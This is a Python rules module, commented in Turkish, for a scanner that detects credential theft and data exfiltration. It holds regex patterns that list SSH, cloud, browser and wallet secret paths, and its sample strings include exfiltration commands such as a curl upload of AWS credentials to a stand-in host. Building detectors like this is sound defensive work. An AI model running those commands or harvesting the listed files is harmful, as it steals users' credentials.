"""Kimlik bilgisi / API anahtarı hırsızlığı kuralları.

Mantık: tek başına "~/.ssh okumak" meşru olabilir. Asıl tehlike, kimlik dosyası
OKUMA + ağa GÖNDERME birlikteliğidir; bu birleşim correlate.py'de ayrıca puanlanır.
Burada her sinyal ayrı kural olarak üretilir.
"""
from .catalog import add
from .models import Severity as S

add("RG-CRED-001", "SSH özel anahtarına erişim", S.MEDIUM, "medium", "credential",
    r"(?:~|\$HOME|\$\{HOME\}|%USERPROFILE%|os\.path\.expanduser\(['\"]~|Path\.home\(\))[^\n]{0,40}[/\\]\.ssh[/\\]?(?:id_[a-z0-9]+|authorized_keys|known_hosts|config)?|[/\\]\.ssh[/\\]id_(?:rsa|ed25519|ecdsa|dsa)\b",
    "SSH anahtarları sunuculara giriş yetkisidir; okunup sızdırılırsa tüm sunucularınız risk altındadır.",
    "Kodun bu dosyaya neden eriştiğini doğrulayın.", keywords=(".ssh",), mitre=("T1552.004",),
    positives=("cat ~/.ssh/id_rsa", "open(os.path.expanduser('~/.ssh/id_ed25519'))"), negatives=("ssh host",))

add("RG-CRED-002", "Bulut sağlayıcı kimlik dosyalarına erişim", S.MEDIUM, "medium", "credential",
    r"[/\\]\.aws[/\\]credentials|[/\\]\.config[/\\]gcloud[/\\](?:credentials|application_default)|[/\\]\.azure[/\\](?:accessTokens|msal)|[/\\]\.kube[/\\]config|[/\\]\.docker[/\\]config\.json|[/\\]\.npmrc\b|[/\\]\.pypirc\b|[/\\]\.git-credentials|[/\\]\.netrc\b|[/\\]\.config[/\\]gh[/\\]hosts\.yml",
    "Bulut/paket yöneticisi/Git kimlik dosyaları okunup sızdırılırsa hesaplarınız ele geçirilir.",
    "Erişim amacını doğrulayın.", keywords=(".aws", ".config", ".azure", ".kube", ".docker", ".npmrc", ".pypirc", ".git-credentials", ".netrc"),
    mitre=("T1552.001",),
    positives=("cat ~/.aws/credentials", "open('/home/u/.npmrc')", "~/.config/gh/hosts.yml"), negatives=("echo hello",))

add("RG-CRED-003", "Tarayıcı / kripto cüzdan verisi hedefleme", S.HIGH, "medium", "credential",
    r"Login Data|User Data[/\\]Local State|cookies\.sqlite|(?<![\w-])logins\.json|key[34]\.db|Chrome[/\\]User Data|Mozilla[/\\]Firefox[/\\]Profiles|Library[/\\]Application Support[/\\](?:Google[/\\]Chrome|Firefox)|wallet\.dat|\.electrum|Exodus[/\\]exodus\.wallet|nkbihfbeogaeaoehlefnkodbefgpgknn|keychain-db|login\.keychain",
    "Tarayıcı şifreleri, çerezler ve cüzdan dosyaları 'stealer' zararlılarının birincil hedefidir.",
    "Böyle bir erişim beklemiyorsanız çalıştırmayın.", keywords=("login data", "local state", "cookies.sqlite", "logins.json", "key3.db", "key4.db", "user data", "firefox", "wallet.dat", "electrum", "exodus", "nkbihfbeogaeaoehlefnkodbefgpgknn", "keychain"),
    mitre=("T1555.003", "T1539"),
    positives=("copy 'Chrome\\User Data\\Default\\Login Data'", "~/.electrum/wallets", "cookies.sqlite"), negatives=("login page",))

add("RG-CRED-004", "Ortam değişkenlerini toplu okuma", S.LOW, "low", "credential",
    r"\bos\.environ(?:\.copy\(\)|\b(?!\s*[\[.]))|\bdict\(os\.environ\)|json\.dumps\(\s*(?:dict\()?os\.environ|JSON\.stringify\(\s*process\.env\s*\)|Object\.(?:entries|keys|assign)\(\s*process\.env|\bprintenv\b\s*(?:\||>)|\benv\s*\|\s*(?:curl|nc|base64)|\bGet-ChildItem\s+env:",
    "Tüm ortam değişkenleri (API anahtarları, token'lar) toplanıyor; sızdırma öncesi tipik adım.",
    "Toplanan verinin nereye gittiğine bakın (RG-NET kuralları).", keywords=("environ", "process.env", "printenv", "env |", "env:"),
    mitre=("T1552.007", "T1082"),
    positives=("data = json.dumps(dict(os.environ))", "JSON.stringify(process.env)", "env | curl -d @- http://x"), negatives=("os.environ['HOME']", "os.environ.get('X')"))

add("RG-CRED-005", "Kimlik verisini ağa gönderme (aynı satır)", S.CRITICAL, "high", "exfil",
    r"(?:id_rsa|id_ed25519|\.aws/credentials|\.git-credentials|\.npmrc|\.pypirc|Login Data|wallet\.dat|JSON\.stringify\(process\.env\)|dict\(os\.environ\)|os\.environ\)|GITHUB_TOKEN|AWS_SECRET)[^\n]{0,200}(?:curl|wget|requests\.(?:post|put)|urllib|axios\.post|fetch\(|https?\.request|nc\s|Invoke-WebRequest|webhook|discord(?:app)?\.com/api/webhooks|api\.telegram\.org/bot)"
    r"|(?:curl|wget|requests\.(?:post|put)|axios\.post|fetch\()[^\n]{0,200}(?:id_rsa|id_ed25519|\.aws/credentials|\.git-credentials|\.npmrc|Login Data|wallet\.dat|JSON\.stringify\(process\.env\)|dict\(os\.environ\)|os\.environ\))",
    "Aynı satırda gizli veri kaynağı ve ağ gönderimi: doğrudan sızdırma (exfiltration) kalıbı.",
    "Çalıştırmayın; varsa anahtarlarınızı hemen yenileyin.", keywords=("curl", "wget", "requests.", "urllib", "axios", "fetch(", "http", "nc ", "webhook", "telegram"),
    mitre=("T1041", "T1552"),
    positives=("curl -d @~/.aws/credentials http://x.example", "requests.post(u, data=os.environ)"), negatives=("print(os.environ['A'])",))

add("RG-NET-001", "Sohbet/webhook uç noktasına veri gönderimi", S.HIGH, "medium", "exfil",
    r"discord(?:app)?\.com/api/webhooks/\d{5,}|api\.telegram\.org/bot[0-9]{5,}:|hooks\.slack\.com/services/T[A-Z0-9]{5,}|webhook\.site/[0-9a-f-]{20,}|requestbin|pipedream\.net|ngrok(?:-free)?\.(?:io|app)|interact\.sh|\boast\.(?:pro|live|site|online|fun|me)|burpcollaborator\.net",
    "Webhook / tünel / out-of-band servisleri sızdırılan verinin en sık hedefidir.",
    "Neden kullanıldığını doğrulayın.", keywords=("discord", "telegram", "slack.com", "webhook.site", "requestbin", "pipedream", "ngrok", "interact.sh", "oast.", "burpcollaborator"),
    mitre=("T1567", "T1102"),
    positives=("https://discord.com/api/webhooks/123456789/abcdef", "https://api.telegram.org/bot123456:ABC/sendMessage"),
    negatives=("https://discord.com/invite/x", "<span>{toast.message}</span>"))

add("RG-NET-002", "Ham IP adresine HTTP isteği", S.MEDIUM, "low", "exfil",
    r"https?://(?!(?:127\.|10\.|192\.168\.|169\.254\.|0\.0\.0\.0|localhost))(?:\d{1,3}\.){3}\d{1,3}(?::\d{2,5})?/",
    "Alan adı yerine IP kullanımı zararlı altyapıda yaygındır (yerel adresler hariç).",
    "Adresin sahibini doğrulayın.", keywords=("http",), mitre=("T1071.001",),
    positives=("curl http://185.12.34.56/payload",), negatives=("http://127.0.0.1:8000/", "http://example.com/"))

add("RG-NET-003", "Kısa URL / paste / anonim dosya servisi", S.LOW, "low", "exfil",
    r"https?://(?:bit\.ly|tinyurl\.com|t\.co|is\.gd|cutt\.ly|rb\.gy|pastebin\.com/raw|paste\.ee/r|hastebin\.com/raw|transfer\.sh|file\.io|0x0\.st|anonfiles\.com|gofile\.io|temp\.sh)/",
    "Hedefi gizleyen veya anonim barındıran servisler; yük indirme/veri sızdırmada kullanılır.",
    "Gerçek hedefi açıp doğrulayın.", keywords=("bit.ly", "tinyurl", "t.co", "is.gd", "cutt.ly", "rb.gy", "pastebin", "paste.ee", "hastebin", "transfer.sh", "file.io", "0x0.st", "anonfiles", "gofile", "temp.sh"),
    mitre=("T1102", "T1105"),
    positives=("https://pastebin.com/raw/abc123",), negatives=("https://github.com/x/y",))
